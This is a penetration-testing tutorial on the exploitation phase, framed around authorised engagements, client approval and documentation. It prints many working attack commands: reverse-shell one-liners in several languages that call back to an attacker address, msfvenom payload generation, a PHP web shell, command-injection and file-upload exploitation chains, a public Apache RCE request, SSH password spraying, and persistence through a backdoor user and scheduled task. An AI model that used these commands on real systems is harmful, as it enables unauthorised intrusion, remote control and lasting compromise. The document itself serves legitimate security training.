# Exploitation Phase

## What Is Exploitation?

Exploitation is where you actually "break in." You've found the unlocked window (vulnerability assessment)—now you're climbing through it.

Think of it like this: A locksmith can identify that a lock is pickable (vulnerability), but exploitation is actually picking that lock to open the door. In penetration testing, exploitation means taking a vulnerability and using it to gain unauthorized access.

**Key terms:**
- **Exploit** = The technique or code that takes advantage of a vulnerability
- **Payload** = What you deliver through the exploit (usually to get a shell)
- **Shell** = Command-line access to the target system
- **Foothold** = Your initial access point into the target network

---

## Why Exploitation Matters

Exploitation proves that vulnerabilities are *real* and *dangerous*—not just theoretical. It's one thing to say "this system is vulnerable to CVE-2021-44228." It's another to demonstrate that you used it to access sensitive data.

**Exploitation demonstrates:**
- Vulnerabilities can actually be exploited (not false positives)
- The real-world impact of security weaknesses
- What an attacker could achieve with the same access
- The urgency of remediation

**Without exploitation, your report says:** "This might be a problem."
**With exploitation, your report says:** "This IS a problem—here's proof."

---

## Key Concepts

### Types of Access

Not all exploitation is the same. Different exploits give you different levels of access:

| Access Type | What It Means | Example |
|-------------|---------------|---------|
| **Remote Code Execution (RCE)** | Execute commands from across the network | Web server exploit gives shell |
| **Local Privilege Escalation** | Elevate privileges on a system you're already on | User → Root/Admin |
| **Authentication Bypass** | Access without valid credentials | Skip login, access admin panel |
| **Information Disclosure** | Read sensitive data | Dump database, read files |
| **Denial of Service** | Crash or disrupt service | Usually avoided in pentests |

### Shells: Your Remote Control

A "shell" is command-line access to a system. It's how you control a compromised machine.

#### Reverse Shell

The target connects *back to you*. Most common because it bypasses firewalls (outbound connections are usually allowed).

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │◄───── connects ────│   Target    │
│  (listener) │                    │  (victim)   │
└─────────────┘                    └─────────────┘
     You                              The server
  waiting for                      reaches out to
   connection                           you
```

**You need:**
1. A listener on your machine
2. A payload on the target that connects back

#### Bind Shell

The target opens a port and *waits for you* to connect. Less common because firewalls often block incoming connections.

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │───── connects ────▶│   Target    │
│             │                    │  (listener) │
└─────────────┘                    └─────────────┘
     You                              The server
  connecting                        waiting for
   to target                         connection
```

#### Web Shell

A script uploaded to a web server that gives you command execution through HTTP requests. Useful when you can upload files but can't get a full shell.

```php
<?php system($_GET['cmd']); ?>
```
Usage: `http://target.com/shell.php?cmd=whoami`

### Payloads: What You Deliver

The payload is what actually runs on the target. Common payload types:

| Payload Type | What It Does | Use Case |
|--------------|--------------|----------|
| **Reverse Shell** | Connects back to attacker | Most common, firewall bypass |
| **Bind Shell** | Opens port for attacker to connect | When outbound is blocked |
| **Meterpreter** | Full-featured shell with extras | Post-exploitation, pivoting |
| **Web Shell** | HTTP-based command execution | Web server compromise |
| **Staged** | Small loader that fetches larger payload | Bypass size limits |
| **Stageless** | Complete payload in one piece | Simpler, more reliable |

### Staged vs. Stageless Payloads

**Staged (e.g., `windows/meterpreter/reverse_tcp`):**
1. Small "stager" is sent to target
2. Stager connects back to you
3. Stager downloads full payload
4. Full payload executes

**Stageless (e.g., `windows/meterpreter_reverse_tcp`):**
1. Complete payload is sent to target
2. Payload executes immediately

**When to use which:**
- **Staged**: When payload size is limited, or you need to evade detection
- **Stageless**: When simplicity and reliability matter more

---

## The Exploitation Process

Here's the systematic approach to exploitation:

```
┌─────────────────────────────────────────────────────────────────┐
│                     EXPLOITATION WORKFLOW                        │
└─────────────────────────────────────────────────────────────────┘

    ┌──────────────┐
    │  Prioritize  │  ← Rank vulnerabilities by success likelihood
    │    Targets   │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Prepare    │  ← Set up exploits, payloads, listeners
    │   Attack     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Test First  │  ← Try on local replica if risky
    │   (if risky) │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Execute    │  ← Run the exploit
    │   Exploit    │
    └──────┬───────┘
           │
           ├─── Failed? ──▶ Troubleshoot or try next
           │
           ▼
    ┌──────────────┐
    │   Confirm    │  ← Verify access, stabilize shell
    │   Access     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Document   │  ← Record everything for report
    │   & Proceed  │
    └──────────────┘
```

---

## Step 1: Prioritize Your Targets

You have a list of vulnerabilities from the assessment phase. Now decide what to exploit first.

### Prioritization Factors

**Consider these factors:**

| Factor | Question | Impact on Priority |
|--------|----------|-------------------|
| **Likelihood of Success** | Is there a reliable exploit? | Higher = prioritize |
| **Complexity** | How hard is it to exploit? | Lower = prioritize |
| **Impact** | What access does it give? | Higher = prioritize |
| **Risk of Damage** | Could it crash something? | Higher = deprioritize |
| **Detection Risk** | Will it trigger alerts? | Consider for evasive tests |

### Simple Prioritization Matrix

| Priority | Characteristics | Examples |
|----------|-----------------|----------|
| **1 - Do First** | Reliable exploit, easy, high impact, low risk | Default creds, public RCE exploits |
| **2 - Do Second** | Good exploit, moderate complexity | SQL injection, authenticated vulns |
| **3 - Do Later** | Complex, uncertain, or higher risk | Buffer overflows, custom exploits |
| **4 - Ask First** | Could cause damage or disruption | Anything that might crash services |

### Example Prioritization

```markdown
## Exploitation Priority List

### Priority 1 - Quick Wins
1. [ ] Anonymous FTP with write access (192.168.1.10)
      - Exploit: Upload web shell, trigger execution
      - Confidence: High (tested locally)

2. [ ] Apache 2.4.49 Path Traversal/RCE (192.168.1.15)
      - Exploit: CVE-2021-41773 (public POC available)
      - Confidence: High

### Priority 2 - Standard Exploits
3. [ ] WordPress plugin vulnerability (192.168.1.20)
      - Exploit: File upload bypass
      - Confidence: Medium

4. [ ] Weak SSH credentials (192.168.1.25)
      - Exploit: Password spray with common passwords
      - Confidence: Medium

### Priority 3 - Complex/Research Required
5. [ ] Custom web application SQL injection (192.168.1.30)
      - Exploit: Manual SQLi, need to develop payload
      - Confidence: Low-Medium

### Priority 4 - Requires Client Approval
6. [ ] SMB EternalBlue (192.168.1.35)
      - Risk: May crash service
      - Action: Discuss with client before attempting
```

---

## Step 2: Prepare Your Attack

Before clicking "exploit," set everything up properly.

### Setting Up Your Listener

For reverse shells, you need something waiting to catch the connection.

#### Netcat Listener (Simple)

```bash
# Basic listener
nc -lvnp 4444

# Explanation:
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port number
```

#### Metasploit Handler (Full Featured)

```bash
msfconsole

# Set up multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100  # Your IP
set LPORT 4444           # Your port
run

# Or as one-liner
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"
```

#### Socat Listener (Stable)

```bash
# More stable than netcat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Encrypted listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash
```

### Generating Payloads with msfvenom

msfvenom creates custom payloads for different targets.

#### Basic Syntax

```bash
msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <output_file>
```

#### Common Payloads

**Windows Reverse Shell:**
```bash
# Meterpreter (full featured)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Simple shell (smaller, fewer features)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

**Linux Reverse Shell:**
```bash
# Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# Simple shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

**Web Payloads:**
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# WAR (Java)
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
```

**Python/Scripting:**
```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o shell.ps1
```

#### Payload Formats Reference

| Format | Flag | Use Case |
|--------|------|----------|
| exe | `-f exe` | Windows executable |
| elf | `-f elf` | Linux executable |
| dll | `-f dll` | Windows DLL |
| asp | `-f asp` | Classic ASP web shell |
| aspx | `-f aspx` | ASP.NET web shell |
| jsp | `-f jsp` | Java web shell |
| war | `-f war` | Java WAR archive |
| php | `-f raw` | PHP web shell |
| py | `-f raw` | Python script |
| ps1 | `-f psh` | PowerShell script |
| sh | `-f raw` | Bash script |

### Manual Reverse Shell One-Liners

Sometimes you can't upload a payload and need to execute a command directly.

#### Bash

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Or with bash -c
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

#### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### PHP

```php
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Perl

```perl
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.1.100",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

```bash
# With -e (if available)
nc -e /bin/sh 192.168.1.100 4444

# Without -e (named pipe method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f
```

#### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> **Resource:** [RevShells.com](https://revshells.com) generates reverse shell commands for any IP/port combination.

---

## Step 3: Test Locally First (When Risky)

For exploits that might crash services or have uncertain outcomes, test on a local replica first.

### When to Test Locally

| Scenario | Test Locally? |
|----------|---------------|
| Well-known exploit with reliable POC | Usually not needed |
| Buffer overflow or memory corruption | **Yes** |
| Modifying someone else's exploit code | **Yes** |
| Custom/developed exploit | **Yes** |
| Exploit could cause DoS | **Yes** |
| You've never used this exploit before | Recommended |

### Setting Up a Test Environment

```bash
# Use Docker for quick service setup
docker run -d -p 8080:80 vulnerables/web-dvwa

# Use Vagrant for full VMs
vagrant init rapid7/metasploitable3-ub1404
vagrant up

# Or manually install vulnerable versions in VirtualBox/VMware
```

### Testing Workflow

1. Set up target service locally (same version as real target)
2. Run exploit against local target
3. Verify it works as expected
4. Note any modifications needed
5. Proceed to real target

---

## Step 4: Execute the Exploit

Time to actually exploit the vulnerability.

### Using Metasploit

Metasploit is the most popular exploitation framework.

#### Basic Workflow

```bash
# Start Metasploit
msfconsole

# Search for exploit
search apache 2.4.49
search type:exploit platform:windows smb

# Select exploit
use exploit/multi/http/apache_normalize_path_rce

# Show options
show options

# Set required options
set RHOSTS 192.168.1.15
set RPORT 80
set LHOST 192.168.1.100
set LPORT 4444

# Show available payloads
show payloads

# Set payload (if needed)
set payload linux/x64/meterpreter/reverse_tcp

# Optional: Show advanced options
show advanced

# Run the exploit
exploit
# or
run
```

#### Useful Metasploit Commands

| Command | What It Does |
|---------|--------------|
| `search <term>` | Find modules |
| `use <module>` | Select module |
| `info` | Show module details |
| `show options` | Show required settings |
| `show payloads` | List compatible payloads |
| `set <option> <value>` | Configure option |
| `setg <option> <value>` | Set global option |
| `check` | Test if target is vulnerable (without exploiting) |
| `exploit` or `run` | Execute the module |
| `exploit -j` | Run in background |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with session |

#### Metasploit Example: EternalBlue

```bash
msfconsole

# Search for EternalBlue
search ms17-010

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure
set RHOSTS 192.168.1.20
set LHOST 192.168.1.100

# Check if vulnerable first
check

# If vulnerable, exploit
exploit
```

### Manual Exploitation

Sometimes Metasploit doesn't have a module, or you need more control.

#### Using Searchsploit Exploits

```bash
# Find the exploit
searchsploit apache 2.4.49

# Copy to current directory
searchsploit -m 50383

# Read and understand it
cat 50383.py

# Modify if needed (LHOST, LPORT, etc.)
nano 50383.py

# Run it
python3 50383.py http://192.168.1.15/cgi-bin/ 192.168.1.100 4444
```

#### Example: Manual SQL Injection to Shell

```bash
# Confirm SQL injection
curl "http://target.com/page.php?id=1'"
# Error confirms SQLi

# Use SQLmap to get shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Or upload shell manually if you have write access
sqlmap -u "http://target.com/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

#### Example: Manual File Upload to Shell

```bash
# Create simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload through vulnerable form
curl -F "file=@shell.php" http://target.com/upload.php

# Execute commands
curl "http://target.com/uploads/shell.php?cmd=id"

# Get reverse shell
curl "http://target.com/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261'"
```

### Exploitation Scenarios

#### Scenario 1: Web Application RCE

**Situation:** Found command injection in web parameter.

```bash
# 1. Start listener
nc -lvnp 4444

# 2. Test command execution
curl "http://target.com/ping.php?ip=127.0.0.1;id"
# Returns: uid=33(www-data)...

# 3. Send reverse shell
curl "http://target.com/ping.php?ip=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.100/4444+0>%261'"

# 4. Catch shell on listener
# Connection received!
```

#### Scenario 2: Default Credentials

**Situation:** Found Tomcat manager with default creds.

```bash
# 1. Confirm credentials work
curl -u tomcat:tomcat http://target.com:8080/manager/html

# 2. Generate WAR payload
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war

# 3. Start listener
nc -lvnp 4444

# 4. Deploy WAR file
curl -u tomcat:tomcat --upload-file shell.war "http://target.com:8080/manager/text/deploy?path=/shell"

# 5. Trigger shell
curl http://target.com:8080/shell/

# 6. Catch shell
# Connection received!
```

#### Scenario 3: Known CVE Exploit

**Situation:** Target running vulnerable Apache 2.4.49.

```bash
# 1. Find exploit
searchsploit apache 2.4.49

# 2. Use exploit
searchsploit -m 50383.py

# 3. Start listener
nc -lvnp 4444

# 4. Run exploit
python3 50383.py http://target.com/cgi-bin/ 192.168.1.100 4444

# 5. Shell received
```

#### Scenario 4: Password Attack

**Situation:** SSH open, have potential usernames.

```bash
# 1. Create user list
echo -e "admin\nroot\njohn\nwww-data" > users.txt

# 2. Use common passwords or create wordlist
# Use rockyou.txt or custom list

# 3. Run Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.15 -t 4

# 4. Use found credentials
ssh admin@192.168.1.15
```

---

## Step 5: Confirm and Stabilize Access

You got a shell! Now make sure it's usable.

### Verify Your Access

```bash
# Who are you?
whoami
id

# Where are you?
hostname
pwd

# What system is this?
uname -a          # Linux
systeminfo        # Windows

# What network?
ip a              # Linux
ipconfig /all     # Windows
```

### Upgrade Your Shell

Raw netcat shells are unstable. Upgrade them.

#### Python PTY Upgrade (Linux)

```bash
# On target shell:
python -c 'import pty;pty.spawn("/bin/bash")'

# Then:
export TERM=xterm
Ctrl+Z  (background the shell)

# On your machine:
stty raw -echo; fg

# Now you have a full TTY
```

#### Full TTY Upgrade Steps

```bash
# 1. Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background shell
Ctrl+Z

# 3. Get your terminal info
echo $TERM
stty -a  # Note rows and columns

# 4. Set raw mode and foreground
stty raw -echo; fg

# 5. Reset terminal
reset

# 6. Set terminal type
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # Use your values
```

#### Script Method

```bash
# On target
script /dev/null -c bash
```

#### Socat Upgrade

```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444
```

### Maintain Access (Within Scope)

During the engagement, you may need persistent access. Common methods:

```bash
# Add SSH key (Linux)
echo "your_public_key" >> ~/.ssh/authorized_keys

# Create user (if authorized)
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd

# Scheduled task (Windows)
schtasks /create /tn "Updater" /tr "powershell -ep bypass -file C:\shell.ps1" /sc daily /st 09:00
```

> **Important:** Only establish persistence if authorized in the Rules of Engagement. Document everything.

---

## Step 6: Document Everything

Documentation during exploitation is critical for your report.

### What to Document

| Item | Why |
|------|-----|
| **Exact commands used** | Reproducibility |
| **Time of exploitation** | Timeline for client |
| **Screenshots** | Proof of access |
| **System information** | Show what was accessed |
| **Files accessed** | Demonstrate impact |
| **Any errors** | Troubleshooting reference |

### Documentation Template

```markdown
## Exploitation: [Target] - [Vulnerability]

**Date/Time:** 2024-01-15 14:32 UTC
**Target:** 192.168.1.15 (web-server-01)
**Vulnerability:** CVE-2021-41773 (Apache Path Traversal/RCE)
**CVSS:** 7.5 (High)

### Attack Steps

1. Started listener on attacker machine
   ```
   nc -lvnp 4444
   ```

2. Executed exploit
   ```
   curl 'http://192.168.1.15/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash' -d 'echo; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
   ```

3. Received reverse shell as www-data

### Evidence

- Shell access as: www-data
- System: Ubuntu 20.04 (kernel 5.4.0)
- Screenshot: exploitation_001.png

### Impact

- Full command execution on web server
- Access to web application files and database credentials
- Potential pivot point for internal network access
```

---

## When Exploits Fail

Not every exploit works. Here's how to troubleshoot.

### Common Failure Reasons

| Issue | Symptoms | Solution |
|-------|----------|----------|
| **Wrong version** | Exploit errors or no effect | Verify target version exactly |
| **Patched** | Exploit doesn't work | Research patch date vs target |
| **Firewall blocking** | No connection received | Try different ports (443, 80) |
| **AV/EDR** | Payload killed | Try different payload, encode |
| **Wrong architecture** | Crashes or fails | x86 vs x64, check target |
| **Missing dependency** | Exploit errors | Check requirements, libraries |
| **Network issues** | Timeouts | Check routing, firewall rules |

### Troubleshooting Steps

```
1. Verify the vulnerability exists
   └── Re-run vulnerability check
   └── Manually verify version

2. Check your listener
   └── Is it running?
   └── Correct IP/port?
   └── Firewall allowing inbound?

3. Check network path
   └── Can target reach you? (try ping)
   └── Try common ports (443, 80, 53)

4. Check payload
   └── Right architecture?
   └── Right format?
   └── Try simpler payload

5. Check exploit code
   └── Read the code
   └── Correct target URL/IP?
   └── Dependencies installed?

6. Try alternatives
   └── Different exploit for same vuln
   └── Manual exploitation
   └── Different payload
```

### Firewall Bypass Tips

If reverse shells aren't connecting:

```bash
# Try common allowed ports
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=80 -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=53 -f elf -o shell.elf

# Try HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o shell.exe

# Try DNS (if desperate)
# Requires more setup, but often allowed
```

---

## Safety Considerations

### Before Exploiting

| Question | Action if "Yes" |
|----------|-----------------|
| Could this crash the service? | Test locally first, inform client |
| Is this production critical? | Get explicit approval |
| Could this corrupt data? | Test locally, have client backup |
| Am I in scope? | Verify target is authorized |

### Client Communication

For risky exploits, communicate:

```markdown
Subject: Exploitation Approval Request - [Target]

Hi [Client Contact],

During testing, I identified a critical vulnerability on [target] that may allow remote code execution.

Vulnerability: CVE-2021-XXXXX
Target: 192.168.1.15 (production-db-01)
Risk: Potential service disruption during exploitation

I recommend attempting this exploit to demonstrate impact. However, there's a small risk of service interruption.

Options:
1. Proceed with exploitation (recommended) - I'll attempt during low-traffic hours
2. Skip exploitation - Document as "vulnerable, not exploited"
3. Test on a staging replica first

Please advise how you'd like to proceed.

Regards,
[Your Name]
```

---

## Common Mistakes to Avoid

| Mistake | Consequence | Prevention |
|---------|-------------|------------|
| Wrong LHOST | Shell connects to wrong IP | Double-check your IP |
| Firewall blocking listener | Never receive shell | Check local firewall rules |
| Wrong payload architecture | Exploit fails | Verify x86 vs x64 |
| Not starting listener first | Miss the connection | Listener before exploit |
| Using default ports blocked by target | No connection | Try 443, 80, 53 |
| Not testing locally | Crash production | Test risky exploits locally |
| Poor documentation | Can't reproduce for report | Document as you go |
| Ignoring AV/EDR | Payload killed | Use evasion techniques |

---

## Quick Reference: Shell Cheatsheet

### Listeners

| Tool | Command |
|------|---------|
| Netcat | `nc -lvnp 4444` |
| Socat | `socat TCP-LISTEN:4444,reuseaddr,fork -` |
| Metasploit | `use exploit/multi/handler` |
| Ncat (encrypted) | `ncat --ssl -lvnp 4444` |

### Reverse Shells (Linux)

| Method | Command |
|--------|---------|
| Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| Netcat | `nc -e /bin/sh IP PORT` |
| PHP | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |

### Reverse Shells (Windows)

| Method | Command |
|--------|---------|
| PowerShell | See detailed command above |
| msfvenom exe | Generate with msfvenom, execute on target |

### Payload Generation

| Target | msfvenom Command |
|--------|------------------|
| Windows x64 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe` |
| Linux x64 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf` |
| PHP | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php` |
| WAR | `msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war` |

### Shell Upgrades

| Method | Command |
|--------|---------|
| Python PTY | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| Script | `script /dev/null -c bash` |
| Socat | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT` |

---

## Summary

Exploitation is where all your preparation pays off. Remember:

1. **Prioritize smartly** - Start with reliable, low-risk exploits
2. **Prepare thoroughly** - Set up listeners and payloads before attacking
3. **Test first** - Try risky exploits locally before production
4. **Document everything** - Your report depends on good notes
5. **Stabilize your shell** - Upgrade raw shells to full TTYs
6. **Communicate with client** - Ask before attempting risky exploits
7. **Troubleshoot methodically** - When exploits fail, work through the checklist

Successful exploitation isn't about running Metasploit and hoping for the best—it's about understanding the vulnerability, preparing properly, and executing carefully. The goal isn't just to get a shell; it's to demonstrate risk in a way that helps the client improve their security.
